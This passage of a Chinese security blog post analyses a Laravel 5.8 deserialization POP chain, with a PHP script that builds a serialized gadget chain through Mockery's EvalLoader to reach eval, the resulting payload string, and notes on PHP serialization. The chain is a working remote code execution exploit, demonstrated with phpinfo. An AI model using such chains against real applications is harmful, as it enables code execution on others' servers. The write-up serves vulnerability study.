class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>$config</code>参数是用户可控的，<code>$this-&gt;config</code>是一个对象，在该方法中会调用<code>$this-&gt;config</code>所指代对象的<code>getName()</code>方法。<code>Mockery\Generator\MockDefinition</code>类中不存在<code>getName()</code>方法。</p>
<p>在<code>Mockery\Generator\MockConfiguration</code>类中存在方法<code>getName()</code>，所以我们应该令<code>$this-&gt;config</code>为<code>Mockery\Generator\MockConfiguration</code>对象：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合前面的分析，这里要令<code>$this-&gt;name</code>是一个不存在的类名，这个很简单。</p>
<p>到这里，前面<code>Mockery\Loader\EvalLoader</code>类<code>load()</code>方法中的if条件语句就能绕过了，接下来看if语句后面的<code>eval</code>语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$definition-&gt;getCode()</code>方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;code</code>用户可控，令其等于我们想要执行的命令，如<code>phpinfo();</code>。到此为止，又一条链构造完成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockConfiguration</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $a = new Mockery\Generator\MockConfiguration('aaaaaaa');    // Class aaaaaaa doesn't exists</span><br><span class="line">    $b = <span class="keyword">new</span> Mockery\Generator\MockDefinition($a, <span class="string">'&lt;? phpinfo();'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent($b);</span><br><span class="line">    $m = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $y = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($m, <span class="string">'load'</span>));</span><br><span class="line">    $z = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($y, $x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize($z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;S:<span class="number">9</span>:<span class="string">"\00*\00events"</span>;O:<span class="number">25</span>:<span class="string">"Illuminate\Bus\Dispatcher"</span>:<span class="number">1</span>:&#123;S:<span class="number">16</span>:<span class="string">"\00*\00queueResolver"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">25</span>:<span class="string">"Mockery\Loader\EvalLoader"</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"load"</span>;&#125;&#125;S:<span class="number">8</span>:<span class="string">"\00*\00event"</span>;O:<span class="number">38</span>:<span class="string">"Illuminate\Broadcasting\BroadcastEvent"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"connection"</span>;O:<span class="number">32</span>:<span class="string">"Mockery\Generator\MockDefinition"</span>:<span class="number">2</span>:&#123;S:<span class="number">9</span>:<span class="string">"\00*\00config"</span>;O:<span class="number">35</span>:<span class="string">"Mockery\Generator\MockConfiguration"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00name"</span>;s:<span class="number">7</span>:<span class="string">"aaaaaaa"</span>;&#125;S:<span class="number">7</span>:<span class="string">"\00*\00code"</span>;s:<span class="number">13</span>:<span class="string">"&lt;? phpinfo();"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/12.png" alt="12"></p>
<p>调用链：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/13.png" alt="13"></p>
<h3 id="0x06-踩坑记录"><a href="#0x06-踩坑记录" class="headerlink" title="0x06 踩坑记录"></a>0x06 踩坑记录</h3><h4 id="1-攻击效果展示问题"><a href="#1-攻击效果展示问题" class="headerlink" title="1. 攻击效果展示问题"></a>1. 攻击效果展示问题</h4><p>在测试<strong>POP链 2</strong>效果的时候，因为我的<code>.env</code>文件中的<code>APP_DEBUG</code>配置的是<code>true</code>。在调试状态下，程序抛出异常就会直接在页面中显示出来，而<strong>POP链 2</strong>从<code>call_user_func</code>返回后，返回给<code>$queue</code>的值是一个空字符串，继续执行到第152行就会报错：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/8.png" alt="8"></p>
<p>在调试状态下我们就不太能直接看到结果了：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/9.png" alt="9"></p>
<p>因为经验太少，所以我当时还一直以为我没构造好，后来才突然反应过来，直接右键查看源码就能看到了呀……又或者可以关掉调试模式，将<code>.env</code>文件中的<code>APP_DEBUG</code>改为<code>false</code>，就不会显示这个异常抛出的界面了。</p>
<h4 id="2-php对象序列化问题"><a href="#2-php对象序列化问题" class="headerlink" title="2. php对象序列化问题"></a>2. php对象序列化问题</h4><p>在php中，对象被序列化后的格式通常为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>&lt;field name&gt;</code>是字段名，当字段类型为<strong>保护字段（protected）</strong>时，在声明的类和该类的子类中可见，但是在该类的实例中不可见，因此，保护字段的字段名在序列化时，字段名前面会加上<code>\0*\0</code>，这里的<code>\0</code>表示ASCII字符的<code>0</code>字符，而不是<code>\0</code>组合，所以也可以用<code>%00</code>来替代。如果要用<code>\0</code>或是<code>\00</code>，那么就需要将前面的对象类型，小写的<code>s</code>改为大写的<code>S</code>，此时就支持将后面的字段名用16进制表示。</p>
<p>当字段类型为<strong>私有字段（private）</strong>时，只在所声明的类中可见，在该类的子类和该类的对象实例中军部可见，所以私有字段的字段名在序列化时，字段名的前面会加上<code>\0&lt;declared class name&gt;\0</code>前缀，这里的<code>&lt;declare class name&gt;</code>表示<strong>声明该私有字段的类的类名</strong>，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，也有可能是它的祖先类。</p>
<h3 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h3><p>我在拜读mochazz师傅的文章的时候，下面有一条评论讲到， 有人提到，没人会那样子去写一个控制器。在现实的应用场景中，确实没有人会这样去写一个控制器，这只是一个漏洞的证明例子，在现实场景中，phar的攻击场景会更多。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a href="https://www.andseclab.com/2020/03/25/laravel5-8-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" target="_blank" rel="noopener">laravel5.8.x 反序列化详记（二）</a></li>
<li><a href="https://www.anquanke.com/post/id/189718#h3-2" target="_blank" rel="noopener">Laravel 5.8 RCE POP链汇总分析</a></li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://bantttian.github.io/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/">https://bantttian.github.io/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/laravel/"># laravel</a>
                    
                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># 反序列化</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/">Laravel 5.8框架POP链分析-下</a>
            
            
            <a class="next" rel="next" href="/2020/05/26/SWPUCTF2018-SimplePHP/">SWPUCTF2018 SimplePHP之phar反序列化学习</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
